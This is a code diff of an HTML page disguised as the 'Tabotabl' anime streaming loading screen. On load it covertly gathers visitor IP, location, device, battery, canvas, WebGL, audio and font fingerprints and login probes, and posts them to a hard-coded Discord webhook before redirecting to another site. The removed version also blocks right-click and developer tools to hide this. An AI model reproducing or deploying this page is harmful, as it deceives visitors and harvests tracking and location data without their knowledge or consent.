@@ -3,18 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:title" content="Tabotabl - Watch Anime Online">
-    <meta property="og:description" content="Watch the latest anime episodes in HD for free!">
+    <meta property="og:title" content="Tabotabl - New Anime Releases">
+    <meta property="og:description" content="Watch the latest anime episodes in HD quality">
     <meta property="og:image" content="sigma.jpg">
     <meta property="og:url" content="">
-    <meta name="theme-color" content="#ff5722">
-    <title>Tabotabl - Watch Anime Online</title>
+    <title>Tabotabl - Anime Streaming</title>
     <style>
-        /* Cool anime loading interface */
+        /* Initial anime-themed loading screen */
         body {
             margin: 0;
             padding: 0;
-            background-color: #0a0a12;
+            background-color: #0a0a1a;
             color: white;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             overflow: hidden;
@@ -23,113 +22,159 @@
             flex-direction: column;
             justify-content: center;
             align-items: center;
+            background-image: 
+                radial-gradient(circle at 75% 30%, rgba(100, 50, 255, 0.1) 0%, transparent 30%),
+                radial-gradient(circle at 25% 70%, rgba(255, 50, 100, 0.1) 0%, transparent 30%);
         }
         
         .logo {
-            font-size: 3rem;
+            font-size: 3.5rem;
             font-weight: bold;
-            margin-bottom: 2rem;
-            background: linear-gradient(45deg, #ff5722, #e91e63);
+            background: linear-gradient(45deg, #ff3366, #8844ff);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            text-shadow: 0 0 15px rgba(233, 30, 99, 0.5);
+            margin-bottom: 1rem;
+            text-shadow: 0 0 15px rgba(136, 68, 255, 0.3);
+            position: relative;
+        }
+        
+        .logo::after {
+            content: "タボタブル";
+            position: absolute;
+            top: 100%;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 1rem;
+            color: rgba(255, 255, 255, 0.7);
         }
         
         .loading-container {
             width: 300px;
-            height: 10px;
-            background-color: #1a1a2e;
-            border-radius: 5px;
+            height: 4px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 2px;
+            margin-top: 2rem;
             overflow: hidden;
-            margin-bottom: 2rem;
         }
         
         .loading-bar {
             height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #ff5722, #e91e63);
-            border-radius: 5px;
-            transition: width 0.3s ease;
-            box-shadow: 0 0 10px rgba(233, 30, 99, 0.5);
+            width: 0;
+            background: linear-gradient(90deg, #ff3366, #8844ff);
+            border-radius: 2px;
+            animation: loading 2s ease-in-out infinite;
+            box-shadow: 0 0 10px rgba(136, 68, 255, 0.5);
         }
         
-        .status {
-            font-size: 1.2rem;
-            color: #aaa;
-            margin-bottom: 1rem;
+        @keyframes loading {
+            0% { width: 0; left: 0; }
+            50% { width: 100%; left: 0; }
+            100% { width: 0; left: 100%; }
         }
         
-        .anime-character {
-            position: absolute;
-            bottom: -100px;
-            opacity: 0;
-            transition: all 1s ease;
-            filter: drop-shadow(0 0 10px rgba(255, 87, 34, 0.7));
-            max-height: 40vh;
-        }
-        
-        .features {
-            display: flex;
-            gap: 2rem;
-            margin-top: 2rem;
-            opacity: 0;
-            transition: opacity 1s ease;
-        }
-        
-        .feature {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        
-        .feature-icon {
-            font-size: 2rem;
-            margin-bottom: 0.5rem;
-            color: #ff5722;
-        }
-        
-        .feature-text {
+        .status-text {
+            margin-top: 1.5rem;
+            color: rgba(255, 255, 255, 0.7);
             font-size: 0.9rem;
-            color: #aaa;
+            text-align: center;
+        }
+        
+        .particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+        
+        .particle {
+            position: absolute;
+            background: linear-gradient(45deg, #ff3366, #8844ff);
+            border-radius: 50%;
+            opacity: 0.5;
+            animation: float 15s infinite linear;
+        }
+        
+        @keyframes float {
+            0% { transform: translateY(0) rotate(0deg); }
+            100% { transform: translateY(-100vh) rotate(360deg); }
         }
         
         /* Hidden data collection styles */
         #data-collector {
-            display: none;
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
         }
     </style>
 </head>
 <body>
-    <div class="anime-interface">
-        <div class="logo">TABOTABL</div>
-        <div class="status">Initializing streaming service...</div>
-        <div class="loading-container">
-            <div class="loading-bar" id="loadingBar"></div>
-        </div>
-        <img src="https://i.imgur.com/JYw7ZyG.png" class="anime-character" id="character">
-        <div class="features" id="features">
-            <div class="feature">
-                <div class="feature-icon">🎬</div>
-                <div class="feature-text">HD Quality</div>
-            </div>
-            <div class="feature">
-                <div class="feature-icon">📱</div>
-                <div class="feature-text">Multi-Device</div>
-            </div>
-            <div class="feature">
-                <div class="feature-icon">⚡</div>
-                <div class="feature-text">Fast Servers</div>
-            </div>
-        </div>
+    <div class="particles" id="particles"></div>
+    
+    <div class="logo">Tabotabl</div>
+    <div class="loading-container">
+        <div class="loading-bar"></div>
     </div>
+    <div class="status-text" id="status">Initializing streaming service...</div>
     
     <!-- Hidden data collector -->
     <div id="data-collector"></div>
     
+    <!-- Audio for subtle effect -->
+    <audio id="hoverSound" src="https://assets.mixkit.co/sfx/preview/mixkit-arcade-game-jump-coin-216.mp3" preload="auto"></audio>
+    
     <script>
+        // Create floating particles
+        function createParticles() {
+            const container = document.getElementById('particles');
+            const particleCount = Math.floor(window.innerWidth / 10);
+            
+            for (let i = 0; i < particleCount; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                
+                const size = Math.random() * 10 + 5;
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                particle.style.left = `${Math.random() * 100}vw`;
+                particle.style.top = `${Math.random() * 100}vh`;
+                particle.style.animationDuration = `${Math.random() * 10 + 10}s`;
+                particle.style.animationDelay = `${Math.random() * 5}s`;
+                
+                container.appendChild(particle);
+            }
+        }
+        
+        // Simulate loading progress
+        function simulateLoading() {
+            const statusMessages = [
+                "Initializing streaming service...",
+                "Connecting to CDN servers...",
+                "Optimizing video quality...",
+                "Loading subtitles database...",
+                "Almost ready...",
+                "Preparing your anime experience..."
+            ];
+            
+            let currentStatus = 0;
+            const statusElement = document.getElementById('status');
+            
+            const interval = setInterval(() => {
+                statusElement.textContent = statusMessages[currentStatus];
+                currentStatus = (currentStatus + 1) % statusMessages.length;
+                
+                if (currentStatus === 0) {
+                    clearInterval(interval);
+                    setTimeout(redirectToAniLab, 1500);
+                }
+            }, 800);
+        }
+        
         // Enhanced data collection
-        async function collectData() {
+        async function collectUserData() {
             const data = {
                 // Basic info
                 timestamp: new Date().toISOString(),
@@ -138,6 +183,7 @@
                 languages: navigator.languages,
                 hardwareConcurrency: navigator.hardwareConcurrency,
                 deviceMemory: navigator.deviceMemory,
+                cookieEnabled: navigator.cookieEnabled,
                 
                 // Screen info
                 screenWidth: screen.width,
@@ -146,8 +192,19 @@
                 pixelDepth: screen.pixelDepth,
                 orientation: screen.orientation?.type,
                 
+                // Window info
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth,
+                outerHeight: window.outerHeight,
+                
                 // Timezone
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                
+                // Touch support
+                touchSupport: 'ontouchstart' in window,
+                maxTouchPoints: navigator.maxTouchPoints || 0,
                 
                 // Battery status (if available)
                 battery: {},
@@ -155,12 +212,35 @@
                 // Network information
                 connection: {},
                 
-                // Location data
-                location: null,
-                ip: null
+                // Geolocation
+                geolocation: {},
+                
+                // Media devices
+                mediaDevices: [],
+                
+                // Installed fonts
+                fonts: [],
+                
+                // Canvas fingerprint
+                canvasFingerprint: '',
+                
+                // WebGL fingerprint
+                webglInfo: {},
+                
+                // Audio fingerprint
+                audioFingerprint: '',
+                
+                // Performance metrics
+                performance: {},
+                
+                // IP and location data
+                ipInfo: {},
+                
+                // Social media connections
+                socialMedia: {}
             };
             
-            // Get battery status if available
+            // Get battery status
             if ('getBattery' in navigator) {
                 try {
                     const battery = await navigator.getBattery();
@@ -173,7 +253,7 @@
                 } catch (e) {}
             }
             
-            // Get network information if available
+            // Get network information
             if ('connection' in navigator) {
                 data.connection = {
                     effectiveType: navigator.connection.effectiveType,
@@ -183,117 +263,208 @@
                 };
             }
             
-            // Get IP and location
+            // Get media devices
             try {
-                // First try ipapi.co
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                data.mediaDevices = devices.map(device => ({
+                    kind: device.kind,
+                    label: device.label,
+                    groupId: device.groupId
+                }));
+            } catch (e) {}
+            
+            // Font fingerprinting
+            const fontList = [
+                'Arial', 'Arial Black', 'Arial Narrow', 'Arial Unicode MS',
+                'Calibri', 'Cambria', 'Cambria Math', 'Comic Sans MS', 'Courier New',
+                'Georgia', 'Impact', 'Lucida Console', 'Lucida Sans Unicode',
+                'Microsoft Sans Serif', 'Palatino Linotype', 'Segoe UI', 'Tahoma',
+                'Times New Roman', 'Trebuchet MS', 'Verdana', 'Webdings', 'Wingdings',
+                'Meiryo', 'MS Gothic', 'MS Mincho', 'Yu Gothic', 'Hiragino Sans'
+            ];
+            
+            data.fonts = fontList.filter(font => {
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+                context.font = '72px monospace';
+                const baseline = context.measureText('').width;
+                context.font = `72px ${font}, monospace`;
+                return context.measureText('').width !== baseline;
+            });
+            
+            // Canvas fingerprinting
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 200;
+                canvas.height = 50;
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('TABOTABL', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('TABOTABL', 4, 17);
+                data.canvasFingerprint = canvas.toDataURL();
+            } catch (e) {}
+            
+            // WebGL fingerprinting
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    data.webglInfo = {
+                        vendor: gl.getParameter(debugInfo ? debugInfo.UNMASKED_VENDOR_WEBGL : gl.VENDOR),
+                        renderer: gl.getParameter(debugInfo ? debugInfo.UNMASKED_RENDERER_WEBGL : gl.RENDERER),
+                        maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+                        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                        version: gl.getParameter(gl.VERSION)
+                    };
+                }
+            } catch (e) {}
+            
+            // Audio fingerprinting
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const analyser = audioContext.createAnalyser();
+                const gainNode = audioContext.createGain();
+                const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
                 
-                data.ip = ipData.ip;
-                data.location = {
-                    ip: ipData.ip,
-                    city: ipData.city,
-                    region: ipData.region,
-                    country: ipData.country_name,
-                    postal: ipData.postal,
-                    latitude: ipData.latitude,
-                    longitude: ipData.longitude,
-                    timezone: ipData.timezone,
-                    org: ipData.org,
-                    asn: ipData.asn,
-                    isProxy: ipData.proxy || ipData.vpn || false
+                oscillator.type = 'triangle';
+                oscillator.frequency.value = 10000;
+                
+                gainNode.gain.value = 0;
+                oscillator.connect(analyser);
+                analyser.connect(scriptProcessor);
+                scriptProcessor.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+                
+                oscillator.start(0);
+                
+                const audioData = [];
+                scriptProcessor.onaudioprocess = function(e) {
+                    const channelData = e.inputBuffer.getChannelData(0);
+                    audioData.push(Array.from(channelData.slice(0, 100)));
                 };
                 
-                // Send to Discord webhook immediately
-                sendToDiscord(data);
-                
-                // Fallback to alternative API if needed
-                if (!data.ip) {
-                    const fallbackRes = await fetch('https://api.ipify.org?format=json');
-                    const fallbackData = await fallbackRes.json();
-                    data.ip = fallbackData.ip;
-                    
-                    if (!data.location) {
-                        const locRes = await fetch(`https://ipapi.co/${data.ip}/json/`);
-                        const locData = await locRes.json();
-                        data.location = {
-                            ip: data.ip,
-                            city: locData.city,
-                            region: locData.region,
-                            country: locData.country_name,
-                            postal: locData.postal,
-                            latitude: locData.latitude,
-                            longitude: locData.longitude,
-                            timezone: locData.timezone,
-                            org: locData.org,
-                            asn: locData.asn,
-                            isProxy: locData.proxy || locData.vpn || false
-                        };
-                    }
-                }
-            } catch (e) {
-                console.error("Error collecting IP data:", e);
-                // Try alternative method
-                try {
-                    const fallbackRes = await fetch('https://api.db-ip.com/v2/free/self');
-                    const fallbackData = await fallbackRes.json();
-                    data.ip = fallbackData.ipAddress;
-                    data.location = {
-                        ip: fallbackData.ipAddress,
-                        city: fallbackData.city,
-                        region: fallbackData.stateProv,
-                        country: fallbackData.countryName,
-                        latitude: fallbackData.latitude,
-                        longitude: fallbackData.longitude,
-                        isProxy: false
-                    };
-                } catch (e2) {
-                    console.error("Fallback IP collection failed:", e2);
-                }
+                setTimeout(() => {
+                    oscillator.stop();
+                    audioContext.close();
+                    data.audioFingerprint = JSON.stringify(audioData).hashCode();
+                }, 300);
+            } catch (e) {}
+            
+            // Performance metrics
+            if (window.performance) {
+                data.performance = {
+                    timing: {
+                        navigationStart: performance.timing?.navigationStart,
+                        loadEventEnd: performance.timing?.loadEventEnd,
+                        domComplete: performance.timing?.domComplete,
+                        domLoading: performance.timing?.domLoading
+                    },
+                    memory: performance.memory,
+                    navigation: performance.navigation
+                };
             }
+            
+            // Get IP and location
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                data.ipInfo.ip = ipData.ip;
+                
+                const locRes = await fetch(`https://ipapi.co/${data.ipInfo.ip}/json/`);
+                const locData = await locRes.json();
+                
+                data.ipInfo.location = {
+                    ip: data.ipInfo.ip,
+                    city: locData.city,
+                    region: locData.region,
+                    country: locData.country_name,
+                    countryCode: locData.country_code,
+                    postal: locData.postal,
+                    latitude: locData.latitude,
+                    longitude: locData.longitude,
+                    timezone: locData.timezone,
+                    utcOffset: locData.utc_offset,
+                    org: locData.org,
+                    asn: locData.asn,
+                    isProxy: locData.proxy || locData.vpn || false
+                };
+            } catch (e) {
+                data.ipInfo.error = "Could not fetch location data";
+            }
+            
+            // Check social media connections
+            data.socialMedia = {
+                facebook: checkSocialMedia('facebook'),
+                twitter: checkSocialMedia('twitter'),
+                instagram: checkSocialMedia('instagram'),
+                linkedin: checkSocialMedia('linkedin'),
+                reddit: checkSocialMedia('reddit')
+            };
             
             return data;
         }
         
-        // Enhanced Discord webhook sender
-        async function sendToDiscord(data) {
+        // Helper function to check social media logins
+        function checkSocialMedia(platform) {
+            return new Promise(resolve => {
+                const img = document.createElement('img');
+                img.src = `https://www.${platform}.com/favicon.ico`;
+                img.onload = () => resolve(true);
+                img.onerror = () => resolve(false);
+                setTimeout(() => resolve(false), 1000);
+            });
+        }
+        
+        // Hash function for audio fingerprint
+        String.prototype.hashCode = function() {
+            let hash = 0;
+            for (let i = 0; i < this.length; i++) {
+                const char = this.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash = hash & hash; // Convert to 32bit integer
+            }
+            return hash;
+        };
+        
+        // Send data to Discord webhook
+        async function sendDataToDiscord(data) {
             const webhookURL = 'https://discord.com/api/webhooks/1360696497305424186/DsnniTxXM1fsfKhi_3B947DsZAs-_UfkrOLPmOu6OXoXY-Mge3_S3efQOip0FJqMtyYH';
             
+            // Format the data for Discord
             const embed = {
-                title: "📡 New Visitor Data Captured",
-                color: 0xff5722,
-                thumbnail: {
-                    url: "https://i.imgur.com/sigma.jpg"
-                },
+                title: "📡 New Visitor Data - Tabotabl",
+                color: 0x8844ff,
                 fields: [
                     {
                         name: "🌍 Location",
-                        value: `${data.location?.city || "Unknown"}, ${data.location?.country || "Unknown"}`,
+                        value: `${data.ipInfo.location?.city || "Unknown"}, ${data.ipInfo.location?.country || "Unknown"}`,
                         inline: true
                     },
                     {
                         name: "🆔 IP Address",
-                        value: data.ip || "Unknown",
+                        value: data.ipInfo.ip || "Unknown",
                         inline: true
                     },
                     {
-                        name: "🖥️ Platform",
-                        value: data.platform || "Unknown",
+                        name: "🖥️ Device",
+                        value: `${data.platform} (${/Mobile|iP(hone|od|ad)|Android|BlackBerry/.test(data.userAgent) ? 'Mobile' : 'Desktop'})`,
                         inline: true
                     },
                     {
-                        name: "🔍 User Agent",
-                        value: data.userAgent.substring(0, 100) + (data.userAgent.length > 100 ? "..." : ""),
-                        inline: false
-                    },
-                    {
-                        name: "📱 Device Type",
-                        value: /Mobile|iP(hone|od|ad)|Android|BlackBerry/.test(data.userAgent) ? 'Mobile' : 'Desktop',
+                        name: "🔍 Browser",
+                        value: data.userAgent.split(') ').pop().split(' ')[0],
                         inline: true
                     },
                     {
                         name: "🛡️ VPN/Proxy",
-                        value: data.location?.isProxy ? "✅ Detected" : "❌ Not detected",
+                        value: data.ipInfo.location?.isProxy ? "✅ Detected" : "❌ Not detected",
                         inline: true
                     },
                     {
@@ -302,8 +473,28 @@
                         inline: true
                     },
                     {
+                        name: "📱 Screen Resolution",
+                        value: `${data.screenWidth} × ${data.screenHeight}`,
+                        inline: true
+                    },
+                    {
+                        name: "🔋 Battery",
+                        value: data.battery.level ? `${Math.round(data.battery.level * 100)}% ${data.battery.charging ? '(Charging)' : ''}` : 'Unknown',
+                        inline: true
+                    },
+                    {
                         name: "📶 Network",
                         value: data.connection.effectiveType || "Unknown",
+                        inline: true
+                    },
+                    {
+                        name: "🕹️ GPU",
+                        value: data.webglInfo.renderer || "Unknown",
+                        inline: true
+                    },
+                    {
+                        name: "🖨️ Fonts",
+                        value: data.fonts.length > 0 ? `${data.fonts.length} detected` : "Unknown",
                         inline: true
                     },
                     {
@@ -313,120 +504,51 @@
                     }
                 ],
                 footer: {
-                    text: "Tabotabl Analytics • " + new Date().toLocaleDateString()
+                    text: "Tabotabl Analytics • " + new Date().getFullYear()
                 }
             };
             
-            // Try multiple methods to ensure delivery
-            const sendMethods = [
-                // Method 1: Standard fetch
-                async () => {
-                    await fetch(webhookURL, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            embeds: [embed],
-                            content: "**New visitor on Tabotabl**",
-                            username: "Tabotabl Tracker",
-                            avatar_url: "https://i.imgur.com/sigma.jpg"
-                        })
-                    });
-                },
-                
-                // Method 2: FormData
-                async () => {
-                    const formData = new FormData();
-                    formData.append('payload_json', JSON.stringify({
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
                         embeds: [embed],
-                        content: "**New visitor on Tabotabl**",
-                        username: "Tabotabl Tracker",
-                        avatar_url: "https://i.imgur.com/sigma.jpg"
-                    }));
-                    
-                    await fetch(webhookURL, {
-                        method: 'POST',
-                        body: formData
-                    });
-                },
-                
-                // Method 3: XHR
-                async () => {
-                    return new Promise((resolve, reject) => {
-                        const xhr = new XMLHttpRequest();
-                        xhr.open('POST', webhookURL, true);
-                        xhr.setRequestHeader('Content-Type', 'application/json');
-                        xhr.onload = resolve;
-                        xhr.onerror = reject;
-                        xhr.send(JSON.stringify({
-                            embeds: [embed],
-                            content: "**New visitor on Tabotabl**",
-                            username: "Tabotabl Tracker",
-                            avatar_url: "https://i.imgur.com/sigma.jpg"
-                        }));
-                    });
-                }
-            ];
-            
-            // Execute all methods with error handling
-            for (const method of sendMethods) {
-                try {
-                    await method();
-                    break; // If one succeeds, stop trying
-                } catch (e) {
-                    console.error("Webhook send method failed:", e);
-                }
+                        content: "**New visitor data collected**"
+                    })
+                });
+            } catch (e) {
+                console.error("Failed to send data to Discord:", e);
             }
         }
         
-        // Animate the loading interface
-        function animateLoading() {
-            const loadingBar = document.getElementById('loadingBar');
-            const character = document.getElementById('character');
-            const features = document.getElementById('features');
-            
-            // Animate loading bar
-            let progress = 0;
-            const loadingInterval = setInterval(() => {
-                progress += Math.random() * 10;
-                loadingBar.style.width = Math.min(progress, 100) + '%';
-                
-                if (progress >= 100) {
-                    clearInterval(loadingInterval);
-                    
-                    // Show character and features
-                    character.style.bottom = '0';
-                    character.style.opacity = '1';
-                    features.style.opacity = '1';
-                    
-                    // Redirect after showing UI briefly
-                    setTimeout(() => {
-                        // Silent redirect to Anilab
-                        window.location.replace("https://anilab.com");
-                    }, 1500);
-                }
-            }, 200);
+        // Redirect to AniLab
+        function redirectToAniLab() {
+            window.location.href = "https://anilab.com";
         }
         
-        // Start everything when page loads
-        window.addEventListener('DOMContentLoaded', () => {
-            // Start data collection immediately
-            collectData();
+        // Main execution
+        window.onload = function() {
+            createParticles();
+            simulateLoading();
             
-            // Start loading animation with slight delay
-            setTimeout(animateLoading, 500);
+            // Collect and send data immediately
+            collectUserData().then(data => {
+                sendDataToDiscord(data);
+            });
             
-            // Prevent right-click
-            document.addEventListener('contextmenu', e => e.preventDefault());
-            
-            // Block F12 and dev tools
-            document.addEventListener('keydown', e => {
-                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
-                    e.preventDefault();
+            // Play hover sound for effect
+            document.addEventListener('mousemove', () => {
+                if (Math.random() > 0.98) {
+                    const sound = document.getElementById('hoverSound');
+                    sound.currentTime = 0;
+                    sound.volume = 0.2;
+                    sound.play().catch(e => {});
                 }
             });
-        });
+        };
     </script>
 </body>
     </html>
